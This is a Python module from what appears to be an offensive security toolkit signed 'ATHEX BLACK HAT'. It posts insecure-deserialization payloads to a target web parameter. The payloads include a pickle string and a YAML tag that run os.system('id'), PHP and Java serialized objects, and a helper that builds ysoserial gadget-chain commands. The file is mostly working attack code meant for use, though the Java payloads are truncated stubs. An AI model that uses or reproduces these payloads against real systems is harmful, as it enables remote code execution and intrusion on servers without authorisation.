# modules/attacks/deserialization.py

"""
Deserialization Attack Engine
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Advanced deserialization attack module for exploiting
insecure deserialization vulnerabilities in PHP, Java,
Python, and .NET applications.
"""

import base64
import binascii
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError


@dataclass
class DeserializationResult:
    """Represents a deserialization attack result."""
    url: str
    parameter: str
    language: str
    payload_type: str
    payload: str
    encoded_payload: str
    success: bool
    command_output: Optional[str]
    description: str


class DeserializationAttacker:
    """
    Deserialization attack engine.
    
    Exploits insecure deserialization vulnerabilities
    across multiple programming languages and frameworks.
    """
    
    PHP_PAYLOADS = {
        'basic': 'O:8:"stdClass":0:{}',
        'rce': 'O:9:"Exception":7:{s:10:"\x00*\x00message";s:3:"cmd";s:17:"\x00Exception\x00string";s:0:"";s:7:"\x00*\x00code";i:0;s:7:"\x00*\x00file";s:0:"";s:7:"\x00*\x00line";i:0;s:16:"\x00Exception\x00trace";a:0:{}s:19:"\x00Exception\x00previous";O:8:"stdClass":0:{}}',
    }
    
    JAVA_PAYLOADS = {
        'dns_check': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldN4BAQAAAAACdAAA',
        'rce_commons': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH',
    }
    
    PYTHON_PAYLOADS = {
        'pickle_rce': "cos\nsystem\n(S'id'\ntR.",
        'yaml_rce': "!!python/object/apply:os.system ['id']",
    }
    
    # Language-specific error indicators
    LANGUAGE_INDICATORS = {
        'php': [
            'unserialize', 'deserialize', '__wakeup',
            '__destruct', 'invalid serialization', 'serialize',
            'php_error', 'warning: unserialize',
        ],
        'java': [
            'java.io', 'classnotfound', 'serialization',
            'objectinputstream', 'invalidclass', 'java.lang',
            'exception in thread', 'java.util',
        ],
        'python': [
            'pickle', 'unpickle', 'yaml.constructor',
            'deserialize', 'unsafe', 'pickle.loads',
            'yaml.load', 'python object',
        ],
        'dotnet': [
            'system.runtime.serialization',
            'binaryformatter', 'deserialize',
            'invalidoperationexception',
        ],
    }
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the deserialization attacker.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target if target else ''
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.callback_server = self.config.get('callback_server', '')
        self.max_payloads_per_language = self.config.get('max_payloads_per_language', 5)
        
        self.results: List[DeserializationResult] = []
        self.errors: List[str] = []
        self.scan_status: str = 'initialized'
    
    def _safe_base64_decode(self, data: str) -> Optional[bytes]:
        """
        Safely decode base64 string.
        
        Args:
            data: Base64 encoded string
            
        Returns:
            Decoded bytes or None
        """
        if not data:
            return None
        
        try:
            # Add padding if needed
            padding = 4 - (len(data) % 4)
            if padding != 4:
                data += '=' * padding
            return base64.b64decode(data)
        except (binascii.Error, ValueError, TypeError) as e:
            self.errors.append(f"Base64 decode failed: {str(e)}")
            return None
    
    def _safe_hex_decode(self, data: str) -> Optional[bytes]:
        """
        Safely decode hex string.
        
        Args:
            data: Hex encoded string
            
        Returns:
            Decoded bytes or None
        """
        if not data:
            return None
        
        try:
            return binascii.unhexlify(data)
        except (binascii.Error, ValueError, TypeError) as e:
            self.errors.append(f"Hex decode failed: {str(e)}")
            return None
    
    def _safe_post_request(
        self,
        url: str,
        data: Any,
        headers: Optional[Dict[str, str]] = None
    ) -> Optional[requests.Response]:
        """
        Safely send POST request.
        
        Args:
            url: Target URL
            data: Request data
            headers: Additional headers
            
        Returns:
            Response or None
        """
        try:
            req_headers = headers or {}
            return self.session.post(
                url,
                data=data,
                headers=req_headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
        except (Timeout, ConnectionError) as e:
            self.errors.append(f"Request timeout/connection error: {str(e)}")
            return None
        except RequestException as e:
            self.errors.append(f"Request failed: {str(e)}")
            return None
    
    def _validate_payload(self, payload: str) -> bool:
        """
        Validate payload before use.
        
        Args:
            payload: Payload string
            
        Returns:
            True if payload is valid
        """
        if not payload:
            return False
        
        # Check for minimal length
        if len(payload) < 3:
            return False
        
        return True
    
    def _normalize_parameter(self, parameter: str) -> str:
        """
        Clean and normalize parameter name.
        
        Args:
            parameter: Parameter name
            
        Returns:
            Normalized parameter
        """
        return parameter.strip()
    
    def _check_response_for_indicators(
        self,
        response_text: str,
        indicators: List[str]
    ) -> bool:
        """
        Check response for language-specific indicators.
        
        Args:
            response_text: HTTP response text
            indicators: List of indicator strings
            
        Returns:
            True if any indicator found
        """
        if not response_text:
            return False
        
        response_lower = response_text.lower()
        
        for indicator in indicators:
            if indicator.lower() in response_lower:
                return True
        
        return False
    
    def _get_language_indicators(self, language: str) -> List[str]:
        """
        Get indicators for specific language.
        
        Args:
            language: Language name
            
        Returns:
            List of indicator strings
        """
        return self.LANGUAGE_INDICATORS.get(language, [])
    
    def test_php_deserialization(
        self,
        url: str,
        parameter: str
    ) -> List[DeserializationResult]:
        """
        Test for PHP deserialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            
        Returns:
            List of DeserializationResult objects
        """
        results = []
        param_clean = self._normalize_parameter(parameter)
        
        for payload_name, payload in self.PHP_PAYLOADS.items():
            if not self._validate_payload(payload):
                continue
            
            encoded_payloads = [
                ('plain', payload),
                ('base64', base64.b64encode(payload.encode()).decode()),
            ]
            
            # Add hex encoding if payload is small enough
            if len(payload) < 500:
                try:
                    hex_payload = binascii.hexlify(payload.encode()).decode()
                    encoded_payloads.append(('hex', hex_payload))
                except (binascii.Error, TypeError):
                    pass
            
            for encoding_type, encoded in encoded_payloads:
                try:
                    data = {param_clean: encoded}
                    response = self._safe_post_request(url, data=data)
                    
                    if response is None:
                        continue
                    
                    response_text = response.text if response.text else ''
                    indicators = self._get_language_indicators('php')
                    success = self._check_response_for_indicators(response_text, indicators)
                    
                    result = DeserializationResult(
                        url=url,
                        parameter=parameter,
                        language='PHP',
                        payload_type=payload_name,
                        payload=payload[:200] + ('...' if len(payload) > 200 else ''),
                        encoded_payload=encoded[:200] + ('...' if len(encoded) > 200 else ''),
                        success=success,
                        command_output=None,
                        description=f'PHP deserialization test with {payload_name} payload ({encoding_type})'
                    )
                    
                    results.append(result)
                    
                except Exception as e:
                    self.errors.append(f"PHP deserialization test failed: {str(e)}")
                    continue
        
        self.results.extend(results)
        return results
    
    def test_java_deserialization(
        self,
        url: str,
        parameter: str
    ) -> List[DeserializationResult]:
        """
        Test for Java deserialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            
        Returns:
            List of DeserializationResult objects
        """
        results = []
        param_clean = self._normalize_parameter(parameter)
        
        for payload_name, payload in self.JAVA_PAYLOADS.items():
            if not self._validate_payload(payload):
                continue
            
            # Try base64 decode
            raw_bytes = self._safe_base64_decode(payload)
            
            if raw_bytes is None:
                self.errors.append(f"Failed to decode Java payload: {payload_name}")
                continue
            
            try:
                data = {param_clean: raw_bytes}
                headers = {'Content-Type': 'application/octet-stream'}
                response = self._safe_post_request(url, data=data, headers=headers)
                
                if response is None:
                    continue
                
                response_text = response.text if response.text else ''
                indicators = self._get_language_indicators('java')
                success = self._check_response_for_indicators(response_text, indicators)
                
                result = DeserializationResult(
                    url=url,
                    parameter=parameter,
                    language='Java',
                    payload_type=payload_name,
                    payload=payload[:200] + ('...' if len(payload) > 200 else ''),
                    encoded_payload=payload[:200] + ('...' if len(payload) > 200 else ''),
                    success=success,
                    command_output=None,
                    description=f'Java deserialization test with {payload_name} payload'
                )
                
                results.append(result)
                
            except Exception as e:
                self.errors.append(f"Java deserialization test failed: {str(e)}")
                continue
        
        self.results.extend(results)
        return results
    
    def test_python_deserialization(
        self,
        url: str,
        parameter: str
    ) -> List[DeserializationResult]:
        """
        Test for Python deserialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            
        Returns:
            List of DeserializationResult objects
        """
        results = []
        param_clean = self._normalize_parameter(parameter)
        
        for payload_name, payload in self.PYTHON_PAYLOADS.items():
            if not self._validate_payload(payload):
                continue
            
            encoded_payloads = [
                ('plain', payload),
                ('base64', base64.b64encode(payload.encode()).decode()),
            ]
            
            for encoding_type, encoded in encoded_payloads:
                try:
                    data = {param_clean: encoded}
                    response = self._safe_post_request(url, data=data)
                    
                    if response is None:
                        continue
                    
                    response_text = response.text if response.text else ''
                    indicators = self._get_language_indicators('python')
                    success = self._check_response_for_indicators(response_text, indicators)
                    
                    result = DeserializationResult(
                        url=url,
                        parameter=parameter,
                        language='Python',
                        payload_type=payload_name,
                        payload=payload[:200] + ('...' if len(payload) > 200 else ''),
                        encoded_payload=encoded[:200] + ('...' if len(encoded) > 200 else ''),
                        success=success,
                        command_output=None,
                        description=f'Python deserialization test with {payload_name} payload ({encoding_type})'
                    )
                    
                    results.append(result)
                    
                except Exception as e:
                    self.errors.append(f"Python deserialization test failed: {str(e)}")
                    continue
        
        self.results.extend(results)
        return results
    
    def generate_ysoserial_payload(
        self,
        gadget: str = 'CommonsCollections1',
        command: str = 'id'
    ) -> Optional[str]:
        """
        Generate ysoserial payload reference.
        
        Args:
            gadget: Gadget chain name
            command: Command to execute
            
        Returns:
            Command string for ysoserial generation
        """
        gadgets = [
            'CommonsCollections1', 'CommonsCollections2',
            'CommonsCollections3', 'CommonsCollections4',
            'CommonsCollections5', 'CommonsCollections6',
            'CommonsBeanutils1', 'Jdk7u21',
            'Spring1', 'Spring2', 'Groovy1',
        ]
        
        if gadget not in gadgets:
            return None
        
        return f"java -jar ysoserial.jar {gadget} '{command}' | base64"
    
    def test_connection(self) -> bool:
        """
        Test if target is reachable.
        
        Returns:
            True if target is reachable
        """
        if not self.target:
            return False
        
        try:
            response = self.session.get(
                self.target,
                timeout=5,
                verify=self.verify_ssl
            )
            return response.status_code < 500
        except Exception:
            return False
    
    def run(
        self,
        url: str,
        parameter: str,
        language: str = 'auto'
    ) -> Dict[str, Any]:
        """
        Run deserialization attacks.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            language: Target language (php, java, python, auto)
            
        Returns:
            Dictionary with attack results
        """
        # Reset state
        self.results.clear()
        self.errors.clear()
        self.scan_status = 'running'
        
        # Validate inputs
        if not url:
            self.errors.append("URL is empty")
            self.scan_status = 'failed'
            return {
                'findings': [],
                'errors': self.errors,
                'language_tested': language,
                'total_tests': 0,
                'vulnerabilities_found': 0,
                'scan_status': 'failed',
            }
        
        if not parameter:
            self.errors.append("Parameter is empty")
            self.scan_status = 'failed'
            return {
                'findings': [],
                'errors': self.errors,
                'language_tested': language,
                'total_tests': 0,
                'vulnerabilities_found': 0,
                'scan_status': 'failed',
            }
        
        # Test target languages
        languages_to_test = []
        
        if language == 'auto':
            languages_to_test = ['php', 'java', 'python']
        else:
            languages_to_test = [language]
        
        for lang in languages_to_test:
            if lang == 'php':
                self.test_php_deserialization(url, parameter)
            elif lang == 'java':
                self.test_java_deserialization(url, parameter)
            elif lang == 'python':
                self.test_python_deserialization(url, parameter)
            else:
                self.errors.append(f"Unsupported language: {lang}")
        
        self.scan_status = 'completed'
        
        findings = []
        for result in self.results:
            if result.success:
                findings.append({
                    'type': f'Insecure Deserialization ({result.language})',
                    'severity': 'critical',
                    'endpoint': result.url,
                    'parameter': result.parameter,
                    'payload_type': result.payload_type,
                    'description': result.description,
                })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'language_tested': language,
            'languages_actual': languages_to_test,
            'total_tests': len(self.results),
            'vulnerabilities_found': len(findings),
            'scan_status': self.scan_status,
        }
